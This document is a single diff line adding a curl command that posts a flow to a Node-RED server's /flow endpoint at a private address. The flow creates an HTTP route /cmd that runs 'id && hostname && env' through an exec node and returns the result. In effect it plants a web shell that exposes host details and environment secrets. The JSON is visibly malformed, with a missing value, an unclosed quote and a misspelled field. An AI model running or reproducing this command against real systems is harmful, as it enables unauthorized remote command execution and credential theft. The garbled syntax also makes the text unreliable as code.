@@ -1,0 +1,1 @@
+curl -s -X POST http://10.10.100.100:1880/flow -H "Content-Type: application/json" -d '{"label":"cmd","nodes":[{"id":"type":"http in","method":"get","url":"/cmd","x":100,"y":100,"wires":[["e1"]]},{"id":"e1","type":"exec","command":"id && hostname && env","addplay":false,"x":300,"y":100,"wires":[["h2]],[],[]]},{"id":"h2","type":"http response","x":500,"y":100,"wires":[]}]}'
